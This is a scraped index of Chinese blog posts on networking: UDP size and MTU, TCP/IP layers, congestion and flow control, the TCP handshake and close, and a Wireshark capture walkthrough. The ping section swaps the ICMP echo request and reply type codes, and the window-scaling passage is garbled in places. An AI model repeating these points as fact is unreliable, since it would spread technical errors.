报文最大长度是65507字节，实际上发送这么大的数据包效果最好吗？我们知道UDP是不可靠的传输协议，为了减少 UDP 包丢失的风险，我们最好能控制 UDP 包在下层协议的传输过程中不要被切割。相信大家都知道MTU这个概念。 MTU 最大传输单元，这个最大传输单元实际上和链路层协议有着密切的关系，EthernetII 帧的结构 DMAC + SMAC + Type + Data + CRC 由于以太网传输电气方面的限制，每个以太网帧都有最小的大小64字节，最大不能超过1518字节，对于小于或者大于这个限制的以太网帧我们都可以视之为错误的数据帧，一般的以太网转发设备会丢弃这些数据帧。由于以太网 EthernetII 最大的数据帧是1518字节，除去以太网帧的帧头（DMAC目的 MAC 地址48bit=6Bytes+SMAC源 MAC 地址48bit=6Bytes+Type域2bytes）14Bytes和帧尾CRC校验部分4Bytes那么剩下承载上层协议的地方也就是Data域最大就只能有1500字节这个值我们就把它称之为MTU。 在下层数据链路层最大传输单元是1500字节的情况下，要想IP层不分包，那么UDP数据包的最大大小应该是1500字节 – IP头(20字节) – UDP头(8字节) = 1472字节。不过鉴于Internet上的标准MTU值为576字节，所以建议在进行Internet的UDP编程时，最好将UDP的数据长度控制在 548 （即 576-8-20 = 548）字节以内。 Reference Oracle System Administration Guide: IP Services - https://docs.oracle.com/cd/E19683-01/806-4075/ipov-10/index.html Comer, D.E., 1995. Internetworking with TCP/IP, Vol. I: Principles, Protocols, and Architecture, 3/e. TCP/IP 协议 - https://juejin.im/entry/57a2b0742e958a006679dae0 关于 TCP/IP，必知必会的十个问题 - https://juejin.im/post/598ba1d06fb9a03c4d6464ab 不为人知的网络编程(六)：深入地理解UDP协议并用好它 - http://www.52im.net/thread-1024-1-1.html","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】TCP/IP","date":"2019-05-08T04:33:53.000Z","path":"2019/05/08/【Network】TCP-IP/","text":"什么是 TCP/IP?TCP/IP 是一类协议系统，它是用于网络通信的一套协议集合，如下图所示。 每一层负责不同的功能。 链路层（Link Layer / Data-link Layer / Network Interface Layer）链路层（Link Layer），有时也称作数据链路层（Data-link Layer）或网络接口层（Network Interface Layer），通常包括操作系统中的设备驱动程序和计算机中对应的网络接口卡。它们一起处理与电缆（或其他任何传输媒介）的物理接口细节。 Frame以太帧（Ethernet Frame） 网络层（Internet Layer）网络层， 有时也称作互联网层， 处理分组在网络中的活动， 例如分组的选路。 在 TCP/IP协议族中，网络层协议包括 IP 协议（网际协议），ICMP协议（In ternet互联网控制报文协议），以及IGMP协议（Internet组管理协议）。 IP datagrams（IP 数据报）传输层（Transport Layer）传输层（Transport Layer）主要为两台主机上的应用程序提供端到端的通信。 在 TCP/IP协议族中， 有两个互不相同的传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。 TCP为两台主机提供高可靠性的数据通信。它所做的工作包括把应用程序交给它的数据分成合适的小块交给下面的网络层，确认接收到的分组，设置发送最后确认分组的超时时钟等。由于运输层提供了高可靠性的端到端的通信，因此应用层可以忽略所有这些细节。 而另一方面， UDP则为应用层提供一种非常简单的服务。 它只是把称作数据报的分组从一台主机发送到另一台主机， 但并不保证该数据报能到达另一端。 任何必需的可靠性必须由应用层来提供。 这两种运输层协议分别在不同的应用程序中有不同的用途，这一点将在后面看到。 packetsTCP段（TCP Segment）应用层（Application Layer）应用层负责处理特定的应用程序细节。 链路层（Link Layer / Data-link Layer / Network Interface Layer）IEEE 802.3 Ethernet Frame Format 网络层（Internet Layer）网络层， 有时也称作互联网层， 处理分组在网络中的活动， 例如分组的选路。 在 TCP/IP协议族中，网络层协议包括 IP 协议（网际协议），ICMP协议（Internet互联网控制报文协议），以及IGMP协议（Internet组管理协议）。 ARP协议我们知道每一块以太网卡都有一个MAC地址，这个地址是唯一的，那么IP包是如何知道这个MAC地址的？这就是ARP协议的工作。 ARP（地址解析）协议是一种解析协议，本来主机是完全不知道这个IP对应的是哪个主机的哪个接口，当主机要发送一个IP包的时候，会首先查一下自己的ARP高速缓存（就是一个IP-MAC地址对应表缓存），如果查询的IP－MAC值对不存在，那么主机就向网络发送一个ARP协议广播包，这个广播包里面就有待查询的IP地址，而直接收到这份广播的包的所有主机都会查询自己的IP地址，如果收到广播包的某一个主机发现自己符合条件，那么就准备好一个包含自己的MAC地址的ARP包传送给发送ARP广播的主机，而广播主机拿到ARP包后会更新自己的ARP缓存（就是存放IP-MAC对应表的地方）。发送广播的主机就会用新的ARP缓存数据准备好数据链路层的的数据包发送工作。 arp -a 可以查询自己的arp缓存 这样的高速缓存是有时限的，一般是20分钟（伯克利系统的衍生系统）。 ICMP协议IP协议并不是一个可靠的协议，它不保证数据被送达，那么，自然的，保证数据送达的工作应该由其他的模块来完成。其中一个重要的模块就是ICMP(网络控制报文)协议。ICMP不是高层协议，而是IP层的协议。 当传送IP数据包发生错误。比如主机不可达，路由不可达等等，ICMP协议将会把错误信息封包，然后传送回给主机。给主机一个处理错误的机会，这也就是为什么说建立在IP层以上的协议是可能做到安全的原因。 pingping可以说是ICMP的最著名的应用，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。 例如：当我们某一个网站上不去的时候。通常会ping一下这个网站。ping会回显出一些有用的信息。一般的信息如下: ping这个单词源自声纳定位，而这个程序的作用也确实如此，它利用ICMP协议包来侦测另一个主机是否可达。原理是用类型码为0的ICMP发请 求，受到请求的主机则用类型码为8的ICMP回应。 ping程序来计算间隔时间，并计算有多少个包被送达。用户就可以判断网络大致的情况。我们可以看到， ping给出来了传送的时间和TTL的数据。 TracerouteTraceroute是用来侦测主机到目的主机之间所经路由情况的重要工具，也是最便利的工具。 Traceroute的原理是非常非常的有意思，它收到到目的主机的IP后，首先给目的主机发送一个TTL=1的UDP数据包，而经过的第一个路由器收到这个数据包以后，就自动把TTL减1，而TTL变为0以后，路由器就把这个包给抛弃了，并同时产生一个主机不可达的ICMP数据报给主机。主机收到这个数据报以后再发一个TTL=2的UDP数据报给目的主机，然后刺激第二个路由器给主机发ICMP数据报。如此往复直到到达目的主机。这样，traceroute就拿到了所有的路由器IP。 ##DHCP 如果逐一为每一台主机设置 IP 地址会是非常繁琐的事情。特别是在移动使用笔记本电脑、只能终端以及平板电脑等设备时，每移动到一个新的地方，都要重新设置 IP 地址。 于是，为了实现自动设置 IP 地址、统一管理 IP 地址分配，就产生了 DHCP（Dynamic Host Configuration Protocol）协议。有了 DHCP，计算机只要连接到网络，就可以进行 TCP/IP 通信。也就是说，DHCP 让即插即用变得可能。 DHCP 不仅在 IPv4 中，在 IPv6 中也可以使用。 NAT NAT（Network Address Translator）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。 除转换 IP 地址外，还出现了可以转换 TCP、UDP 端口号的 NAPT（Network Address Ports Translator）技术，由此可以实现用一个全局 IP 地址与多个主机的通信。 NAT（NAPT）实际上是为正在面临地址枯竭的 IPv4 而开发的技术。不过，在 IPv6 中为了提高网络安全也在使用 NAT，在 IPv4 和 IPv6 之间的相互通信当中常常使用 NAT-PT。 传输层（Transport Layer）传输层主要为两台主机上的应用程序提供端到端的通信。 在 TCP/IP协议族中， 有两个互不相同的传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。 TCP为两台主机提供高可靠性的数据通信。它所做的工作包括把应用程序交给它的数据分成合适的小块交给下面的网络层，确认接收到的分组，设置发送最后确认分组的超时时钟等。由于运输层提供了高可靠性的端到端的通信，因此应用层可以忽略所有这些细节。 TCP 协议面向有连接，能正确处理丢包，传输顺序错乱的问题，但是为了建立与断开连接，需要至少7次的发包收包，资源浪费 而另一方面， UDP则为应用层提供一种非常简单的服务。 它只是把称作数据报的分组 从一台主机发送到另一台主机， 但并不保证该数据报能到达另一端。 任何必需的可靠性必须由应用层来提供。 这两种运输层协议分别在不同的应用程序中有不同的用途，这一点将在后面看到。 UDP 面向无连接，不管对方有没有收到，如果要得到通知，需要通过应用层 应用层（Application Layer）Reference Oracle System Administration Guide: IP Services - https://docs.oracle.com/cd/E19683-01/806-4075/ipov-10/index.html Comer, D.E., 1995. Internetworking with TCP/IP, Vol. I: Principles, Protocols, and Architecture, 3/e. TCP/IP 协议 - https://juejin.im/entry/57a2b0742e958a006679dae0 关于 TCP/IP，必知必会的十个问题 - https://juejin.im/post/598ba1d06fb9a03c4d6464ab","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】TCP 的拥塞控制（Congestion Handling）","date":"2019-05-08T04:32:12.000Z","path":"2019/05/08/【Network】TCP-拥塞控制/","text":"TCP的拥塞控制（Congestion Handling）拥塞（Congestion）：即对资源的需求超过了可用的资源。若网络中许多资源同时供应不足，网络的性能就要明显变坏，整个网络的吞吐量随之负荷的增大而下降。 拥塞控制（Congestion Handling）：防止过多的数据注入到网络中，最终避免网络中的路由器或链路过载。拥塞控制所要做的都有一个前提：网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。 几种拥塞控制方法 慢开始（slow-start） 拥塞避免（congestion avoidance） 快重传（fast retransmit） 快恢复（fast recovery） 慢开始算法和拥塞避免算法发送方维持一个拥塞窗口 cwnd（congestion window）的状态变量。拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。发送方让自己的发送窗口等于拥塞。 发送方控制拥塞窗口的原则是：只要网络没有出现拥塞（及时收到了对已发送报文段的确认），拥塞窗口（cwnd）就再增大一些，以便把更多的分组发送出去。但只要网络出现拥塞，拥塞窗口就减小一些，以减少注入到网络中的分组数。 慢开始算法当发送方主机开始发送数据时，如果立即大量数据字节注入到网络，那么就有可能引起网络拥塞，因为现在并不清楚网络的负荷情况。 因此，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是说，发送方主机由小到大逐渐增大拥塞窗口数值。 通常在刚刚开始发送报文段时，发送方主机先把拥塞窗口（cwnd）设置为一个最大报文段（MSS）的数值。而在每收到一个对已发送报文段的确认（本质上是一个ACK报文段）后，把拥塞窗口增加至多一个MSS的数值。用这样的方法逐步增大发送方的拥塞窗口（cwnd） ，可以使分组注入到网络的速率更加合理。 每经过一个传输轮次，拥塞窗口（cwnd）就加倍。一个传输轮次所经历的时间其实就是往返时间RTT。不过“传输轮次”更加强调：把拥塞窗口（cwnd）所允许发送的报文段都连续发送出去，并收到了对已发送的最后一个字节的确认。 另，慢开始的“慢”并不是指cwnd的增长速率慢，而是指在TCP开始发送报文段时先设置cwnd=1，使得发送方在开始时只发送一个报文段（目的是试探一下当前网络的拥塞情况），然后再逐渐增大cwnd。 为了防止拥塞窗口（cwnd）增长过大引起网络拥塞，还需要设置一个慢开始门限（ssthresh）状态变量。 慢开始门限（ssthresh）的用法如下： 当 cwnd &lt; ssthresh 时，使用上述的慢开始算法。 当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。 当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞控制避免算法。 拥塞避免算法让拥塞窗口cwnd缓慢地增大，即每经过一个传输轮次（一个传输轮次等于一个往返时间RTT），就把发送方的拥塞窗口cwnd加1，而不是加倍。这样拥塞窗口cwnd按线性规律缓慢增长，比慢开始算法的拥塞窗口增长速率缓慢得多。 无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（其判断依据是没有收到确认），就要把慢开始门限（ssthresh）设置为出现拥塞时的发送方窗口值的一半（但不能小于2）。然后把拥塞窗口cwnd重新设置为1，执行慢开始算法。这样做的目的就是要迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕。 如下图，用具体数值说明了上述拥塞控制的过程。现在发送窗口的大小和拥塞窗口一样大。 当TCP连接进行初始化时，把拥塞窗口（cwnd）值置为1。前面已说过，为了便于理解，图中的窗口单位不使用字节而使用报文段的个数。慢开始门限（ssthresh）的初始值设置为16个报文段，即 cwnd = 16 。 在执行慢开始算法时，把拥塞窗口（cwnd）值的初始值为1。以后发送方每收到一个对已发送报文段的确认ACK报文段后，就把拥塞窗口值加1，然后开始下一轮的传输（图中横坐标为传输轮次）。因此拥塞窗口（cwnd）值随着传输轮次按指数规律增长。当拥塞窗口（cwnd）值增长到慢开始门限值（ssthresh）时（即当cwnd=16时），就改为执行拥塞控制算法，此后拥塞窗口（cwnd）值按线性规律增长。 假定拥塞窗口（cwnd）值增长到24时，网络出现超时（这很可能就是网络发生拥塞了）。更新后的慢开始门限（ssthresh）值变为12（即变为出现超时时的拥塞窗口数值24的一半），拥塞窗口（cwnd）值被重新设置为1，并执行慢开始算法。当cwnd=ssthresh=12时，改为执行拥塞避免算法，拥塞窗口按线性规律增长，每经过一个往返时间增加一个MSS的大小。 强调：“拥塞避免”并非指完全能够避免了拥塞。利用以上的措施要完全避免网络拥塞还是不可能的。“拥塞避免”是说在拥塞避免阶段将拥塞窗口控制为按线性规律增长，使网络比较不容易出现拥塞。 快重传（Fast retransmit）快重传算法首先要求：接收方每收到一个失序的报文段后，就立即发出一个重复确认（为的是使发送方尽早知道有报文段没有到达接收方），而不要等到自己发送数据时才进行捎带确认。 如果数据发送方连续收到3个或3个以上重复的ACK，会判定此报文段丢失，并进行重新传递，而不会等待RTO（Retransmission Timeout，重传超时时间），这就叫做快速重传。 接收方收到了M1和M2后都分别发出了确认。现在假定接收方没有收到M3但接着收到了M4。 显然，接收方不能确认M4，因为M4是收到的失序报文段。根据 可靠传输原理，接收方可以什么都不做，也可以在适当时机发送一次对M2的确认。 但按照快重传算法的规定，接收方应及时发送对M2的重复确认，这样做可以让 发送方及早知道报文段M3没有到达接收方。发送方接着发送了M5和M6。接收方收到这两个报文后，也还要再次发出对M2的重复确认。这样，发送方共收到了 接收方的四个对M2的确认，其中后三个都是重复确认。 快重传算法还规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段M3，而不必 继续等待M3设置的重传计时器到期。 由于发送方尽早重传未被确认的报文段，因此采用快重传后可以使整个网络吞吐量提高约20%。 快恢复（Fast recovery）与快重传配合使用的还有快恢复算法，其过程有以下两个要点： 当发送方连续收到三个重复确认，就执行“乘法减小”算法，把慢开始门限ssthresh减半。 与慢开始不同之处是，现在不执行慢开始算法（即拥塞窗口cwnd现在不设置为1），而是把cwnd值设置为慢开始门限ssthresh减半后的数值，然后开始执行拥塞避免算法（“加法增大”），使拥塞窗口缓慢地线性增大。 Reference 关于 TCP/IP，必知必会的十个问题 - https://juejin.im/post/598ba1d06fb9a03c4d6464ab#heading-28","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】TCP 的流量控制（Traffic Control） - 滑动窗口（Sliding Window）","date":"2019-05-07T07:59:30.000Z","path":"2019/05/07/【Network】TCP-流量控制/","text":"利用滑动窗口（Sliding Window）实现流量控制（Traffic Control）如果发送方把数据发送得过快，接收方可能会来不及接收，这就会造成数据的丢失。所谓流量控制（Traffic Control）就是让发送方的发送速率不要太快，要让接收方来得及接收。 利用滑动窗口（Sliding Window）机制可以很方便地在TCP连接上实现对发送方的流量控制。 设A向B发送数据。在连接建立时，B告诉了A：“我的接收窗口是 rwnd = 400 ”(这里的 rwnd 表示 receiver window) 。因此，发送方的发送窗口不能超过接收方给出的接收窗口的数值。请注意，TCP的窗口单位是字节，不是报文段。TCP连接建立时的窗口协商过程在下图中没有显示出来。 再设每一个报文段为100字节长，而数据报文段序号的初始值设为1。大写ACK表示首部中的确认位ACK，小写ack表示确认字段的值ack。 从图中可以看出，B进行了三次流量控制。第一次把窗口减少到 rwnd = 300 ，第二次又减到了 rwnd = 100 ，最后减到 rwnd = 0 ，即不允许发送方主机A再发送数据。 这使得发送方A会保持暂停发送数据的状态，直到主机B重新发出一个新的窗口值。B向A发送的三个报文段都设置了 ACK = 1 ，只有在ACK=1时确认号字段才有意义。 TCP为每一个连接设有一个持续计时器(persistence timer)。只要TCP连接的一方收到对方的零窗口通知，就启动持续计时器。若持续计时器设置的时间到期，就发送一个零窗口控测报文段（携1字节的数据），那么收到这个报文段的一方就重新设置持续计时器。TCP的窗口机制大家都知道TCP和UDP的区别是，TCP是基于连接的(三次握手)，而且TCP数据的传输是可靠的，所谓可靠是指，依托序列号及确认号机制让TCP的传输过程中，只要出现丢包就会重传。 但是TCP的确认机制也让TCP连接双方的数据传输速度变慢，也就是说，一方发送数据需要等待对方的确认才继续发送后续数据。这就体现的窗口机制的作用，所谓窗口，也就是充分利用双方的带宽及缓冲区(Buffer)。举个栗子，发送方不必等待对方的确认，可以连续发送多个数据包给对方，而对方可以暂时把这些数据存放在缓冲区，并给对方一个确认。这样，可以大大增加数据传输的速度。 这样做的问题是一旦当接收方的缓冲区填满或即将填满时，就会产生不堪重负的情况，那么这就需要TCP窗口的实时更新机制。 举个栗子，接收方窗口大小设置的是50000，也就是说发送方可以不必等待确认，而一次性发送50000字节的数据，一旦接收方意识到不堪重负的情况，可以发送窗口更新通知告诉发送方，现在的窗口大小是30000，请减少一次性发送数据的字节数。某些极端情况，接收方的Buffer完全填满，这时，会发送ZeroWindowSize通知，让发送方暂时停止数据传输，并等待下一个确认通知。 下面我们来看看抓包中是如何体现窗口的特征的： 红框中的那一行可能会让大家疑惑。为什么会有一个Calculated window size呢？ 这张图中我们可以看到，windows size的值是2060，但是Calculated Windows Size的值却是131840，这是怎么回事呢？ 事实上，在上图这个数据报对应连接的TCP三次握手中的SYN数据报中（对应下图），在Options区包含一个Window Size Scaling，设计出这个选项是因为如今的带宽已经大规模提升，千兆到桌面也是一件常事儿，因此，65535长度的窗口大小已经显得有些小了，为了突破这个限制，便有了Window Size Scaling选项。 我们就具体来看看TCP Header中的这个Option：TCP Window Size Scaling。 可以看到这个字段的值为6，也就是要将Window Size的值左移六2位，即乘以64，因此，上图中我们看到window size值是2060，但是真正选用的值却是2060 * 64 = 131840。 Reference TCP的流量控制和拥塞控制 - https://blog.csdn.net/yechaodechuntian/article/details/25429143 浅谈TCP的窗口字段 - https://blog.51cto.com/shjrouting/1612855","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】TCP 为什么是三次握手，而不是两次或四次？","date":"2019-05-06T13:20:31.000Z","path":"2019/05/06/【Network】TCP-为什么是三次握手/","text":"TCP报文的分类TCP看似复杂，其实可以归纳为以下5种报文： SYN（建立连接报文） Data （携带用户数据的数据传输报文） FIN（断开连接报文） Reset（重置连接报文） ACK（ACK确认报文） TCP报文的确认问题其中1、2、3分别为建立连接、数据传输、断开连接，这三种报文接收方在接收到后，一定要向发送方发送ACK确认报文以表示确认。 为何要确认，因为这就是可靠传输依赖的机制。如果接收方在超时时间内不确认，发送方就会一直重传，直到接收方确认为止，或者到达了重传上限次数，最终Reset连接。 4、5 为重置连接报文、确认ACK报文，这两种报文接收方接收到后要发送ACK确认报文以确认吗？不需要！因此，自然地，发送方也不会重传这2种类型的报文（因为由于没有确认，对于发送方而言，它根本不知道数据报有没有到达接收方，因而重发机制无从设置）。 为何Reset报文不需要ACK确认? 因为发送Reset报文的一端，在发送完这个报文之后，和该TCP Session有关的内存结构体瞬间全部释放，无论接收方收到或没有收到，关系并不大。 如果接收方收到Reset报文，也会释放该TCP Session 的相关内存结构体。 如果接收方没有收到Reset 报文，可能会继续发送让接收方弹射出Reset报文的报文，到最后对方一样会收到Reset 报文，并最终释放内存。 为何ACK报文不需要ACK确认? 这里的ACK报文，是指没有携带任何数据的裸ACK报文，对方收到这样的ACK报文，自然也不需要ACK。否则，对方为了确认已发送的ACK，还要确认已发送的ACK的ACK，这就是一个死循环，永无止息。 所以为了避免这个死循环，一律不允许对对方的裸ACK报文进行确认（通过发送一个ACK报文）。 为什么要三次握手？三次握手是相对于两次握手而言的。 两次握手两次握手是指，当客户端期望与服务端建立连接时，客户端向服务端发送一个SYN报文段，服务端收到后，向客户端发送一个ACK报文段。当客户端收到后，双方都会认为这个连接建立成功了。 三次握手解决的问题不采用两次握手，而使用三次握手，来作为连接建立完成的标志，是为了避免已失效的客户端连接请求报文段（因为网络延迟问题）突然又传送到了服务端，因而建立了一个不被期望的客户端-服务端连接的情况。 “已失效的连接请求报文段”“已失效的连接请求报文段”的产生在这样一种情况：客户端发出的第一个连接请求报文段（SYN报文段）并没有丢包（丢包是指，因为某些原因被中途经过的某个网络节点将这个包丢弃了），而是在某个网络结点长时间地滞留了，以至于延误（delay）到连接释放以后的某个时间点才到达服务端。 本来这是一个早已失效的报文段，对于客户端而言，也不希望再次建立与服务端的连接了。 但服务端收到此过时的连接请求报文段后，就误认为是客户端再次发出的一个新的连接请求。于是就向客户端发出确认报文段（ACK报文段），同意建立连接。假设不采用“三次握手”，而采用两次握手，那么这时，只要服务端发出确认报文段（ACK报文段）后，服务端就会认为新的连接已经建立完成了。 而事实上，这个建立完成的连接，并不是被客户端期望的，因此客户端不会利用这个连接，因而也不会向服务端通过这个连接来发送任何数据。 前面也提到了，由于服务端认为新的连接已经建立完成了，因而会一直苦苦地等待数据，最终服务端的资源就白白浪费掉了。 采用三次握手后： 而采用三次握手后，被延误的连接请求报文段（SYN报文段）到达了服务端后，服务端因无法判断这个报文段是正常的请求还是被延误的请求，因而自然会向客户端发出确认报文段（SYN+ACK报文段）。 然而，对于客户端而言，它能够判断这个连接请求报文段（SYN报文段）是自己之前发送的，但是因为被延误（delay）了，因此自然没有意义，所以不会向服务端发送对应的ACK报文段。 服务端通过依赖一个超时计时机制，由于在较短时间后没有得到客户端发送的ACK报文段，因而就知道客户端并没有真正要求建立连接，最终不会认为这个连接建立完成了。 因此，三次握手避免了在这种场景下，服务端的资源被白白浪费掉的情况。 换一个角度的分析这个问题的本质是，通信信道不可靠，但是通信双方仍然需要就某个问题达成一致。 而要解决这个问题，无论你在消息中包含什么信息，三次通信是理论上的最小值。 所以三次握手不是TCP本身的要求，而是为了满足”在不可靠信道上可靠地传输信息”这一需求所导致的。 请注意这里的本质需求，信道不可靠，数据传输要可靠。 三次达到了，那后面你想接着握手也好，发数据也好，跟进行可靠信息传输的需求就没关系了。 因此，如果信道是可靠的，即无论什么时候发出消息，对方一定能收到，或者你不关心是否要保证对方收到你的消息，那就能像UDP那样直接发送消息就可以了。 TCP的三次握手有同学会说，按照这么说，TCP连接应该是四次消息交互啊。 1.A 发送SYN 报文给B，这是第一次报文交互。 2. B发送ACK确认A的SYN报文，这是第二次报文交互 3. B发送自己的SYN报文给A，这是第三次报文交互 4. A需要ACK确认B的SYN报文，这是第四次报文交互 以上的演绎没有问题，但是报文2、3为何要分开发送呢？增加了延迟不说，同时还白白浪费了网络的带宽，完全可以将报文2、3合并起来，不就是在报文2的ACK状态位的位置置“1”就结了吗？ 这就是三次消息交互的由来！ Reference TCP 为什么是三次握手，而不是两次或四次？ - https://mp.weixin.qq.com/s/NIjxgx4NPn7FC4PfkHBAAQ TCP 为什么是三次握手，而不是两次或四次？ - https://www.zhihu.com/question/24853633","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】TCP 四次挥手（TCP Four-way Wavehand）","date":"2019-05-06T05:09:30.000Z","path":"2019/05/06/【Network】TCP-四次挥手/","text":"当客户端和服务器通过三次握手建立了TCP连接以后，当数据传送完毕，肯定是要断开TCP连接的。那对于TCP的断开连接，就有了四次挥手（TCP Four-way Wavehand）。 四次挥手（TCP Four-way Wavehand）由于TCP连接是全双工的，因此每个方向的连接必须单独地进行关闭，于是TCP连接的断开需要进行“四次挥手”（两端分别进行FIN+ACK和ACK两次挥手）。 ![TCP 四次握手 - TCP Four-way Handshake](assets/TCP 四次握手 - TCP Four-way Handshake.png) TCP连接断开的过程： 客户端发起请求，向服务端发送一个FIN报文段（其中Seq = x, Ack = l)，用来关闭从客户端到服务端的传输。客户端的状态变为FIN_WAIT_1状态。此时客户端仍然可以接收数据。如果这之前发出的数据中存在没有ACK的，客户端仍然会重发这些数据。 服务端收到客户端的FIN包，然后向客户端发回一个ACK报文段（Ack = x + 1, Seq = l）作为确认，此后服务端进入CLOSE_WAIT状态。 同时，服务端向客户端发送一个FIN报文段（Seq = l, Ack = x + 1），用来关闭从服务端到客户端的传输，此后服务端的状态变为LAST_ACK。 客户端收到服务端发送的FIN报文段后，进入TIME_WAIT状态，然后向服务端发回一个ACK包（Ack = l + 1, Seq = x + 1）作为确认。服务端收到后，Server进入CLOSED状态。最终四次挥手结束，连接断开（CLOSE）。 注意：TIME_WAIT状态需要经过2MSL（最大报文段生存时间）才能返回到CLOSED状态，原因： TIME_WAIT确保有足够的时间让对端收到了ACK（如果被动关闭的那方没有收到ACK，就会触发被动端重发FIN，一来一去正好2个MSL） 有足够的时间让这个连接不会跟后面的连接混在一起（部分路由器会缓存数据包导致连接重用） 以下为动画演示四次挥手的交互过程： 四次握手时的状态变化 为什么要四次挥手TCP协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。TCP是全双工模式，这就意味着： 当主机1向主机2发出FIN报文段时，只是表示主机1已经没有数据要发送了，即主机1告诉主机2，它的数据已经全部发送完毕了； 但是，这个时候主机1还是可以接受来自主机2的数据；当主机2返回ACK报文段时，表示它已经知道主机1没有数据发送了，但是主机2仍然还是可以发送数据到主机1的； 当主机2也发送了FIN报文段时，这个时候就表示主机2也没有数据要发送了，就会告诉主机1，我也没有数据要发送了，之后彼此就会愉快的中断这次TCP连接。 Wireshake抓包学习TCP 四次挥手可以增加tcp &amp;&amp; tcp.flags.fin == 1过滤条件，可以让我们找到两条FIN报文段。去掉过滤条件，并找到这两条FIN报文段对应的ACK报文段。 一个完整的四次挥手过程如下所示： 分析#6939Client -&gt; Server [FIN, ACK] Sequence number 196 Acknowledgement number: 1689 #6941Server -&gt; Client [ACK] Sequence number 1689 Acknowledgement number: 197 #6942Server -&gt; Client [FIN, ACK] Sequence number 1689 Acknowledgement number: 197 #6951Client -&gt; Server [ACK] Sequence number 197 Acknowledgement number: 1690 Reference 关于 TCP/IP，必知必会的十个问题 - https://juejin.im/post/598ba1d06fb9a03c4d6464ab 脑残式网络编程入门(一)：跟着动画来学TCP三次握手和四次挥手 -http://www.52im.net/thread-1729-1-1.html [通俗易懂]深入理解TCP协议（上）：理论基础 - http://www.52im.net/thread-513-1-1.html","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】Wireshark 抓包学习TCP通讯","date":"2019-05-03T05:46:34.000Z","path":"2019/05/03/【Network】Wireshark-抓包学习TCP通讯/","text":"三次握手 (Three-way Handshake) 过程 场景我们在浏览器的地址栏中输入swsmile.info，以观察浏览器进程与这个主机的Web服务器进程进行三次握手的过程。 图示![三次握手 (Three-way Handshake) 过程-6851119](assets/三次握手 (Three-way Handshake) 过程.png) 分析通过添加过滤条件(ip.addr == 185.199.109.153 &amp;&amp; tcp.port == 63901) || dns.qry.name == swsmile.info，可以看到： 本机（192.168.16.227）向本地设置的DNS服务器（192.168.16.1）查询swsmile.info 主机的DNS信息； 该DNS服务器返回以下DNS查询信息： 12345swsmile.info: type CNAME, class IN, cname swsmile.github.ioswsmile.github.io: type A, class IN, addr 185.199.109.153swsmile.github.io: type A, class IN, addr 185.199.110.153swsmile.github.io: type A, class IN, addr 185.199.108.153swsmile.github.io: type A, class IN, addr 185.199.111.153 总结来说，swsmile.info 主机的IP为185.199.109.153、185.199.110.153、185.199.108.153或185.199.111.153。 本机浏览器与IP为185.199.109.153的主机尝试进行TCP连接，并进行三次握手； 本机发送SYN报文段，Seq = 0； 185.199.109.153发送SYN+ACK报文段，Ack = 1，Seq = 0； 本机发送ACK报文段，Ack = 1； 三次握手完成，双方都认为连接建立完成，因此此后任何一方都可以向对方发送数据。 发送一个HTTP请求以请求主页的内容 Ethernet II Frame总长度为762 ，其中Header长度14 bytes，Data区长度748 bytes IP datagram总长度为748 bytes，其中Header长度20 bytes，则Body为728 bytes TCP 包总长度为728 bytes，TCP Header长度为32 bytes（其中 options区域长度为12 bytes），TCP Body长度为696 bytes HTTP包的长度为696 bytes Sequence number为1 Acknowledgement number为1 TCP Segment被重装配成HTTP包的过程场景我们再来看一个浏览器进程发送HTTP Request以请求一个图片文件，操作系统重装配（Reassemble）收到的多个TCP Segment最终生成一个完整的HTTP Response的过程。 这个HTTP 的Request如下所示： 1234567891011GET /logo.jpg HTTP/1.1Host: swsmile.infoConnection: keep-alivePragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36Accept: image/webp,image/apng,image/*,*/*;q=0.8Referer: http://swsmile.info/Accept-Encoding: gzip, deflateAccept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-GB;q=0.7Cookie: _ga=GA1.2.1893643200.1546350896; Hm_lvt_4481376a6b117446f0ad6f2b9b796afc=1554796946,1554900954,1555126437,1556590964; _gid=GA1.2.507500758.1556768292; Hm_lpvt_4481376a6b117446f0ad6f2b9b796afc=1556769331 通过在Wireshark中，添加过滤条件ip.addr == 185.199.109.153 &amp;&amp; tcp.port == 63908，可以看到： 图示![TCP Segment被重装配成HTTP包的过程](assets/TCP Segment被重装配成HTTP包的过程.png) 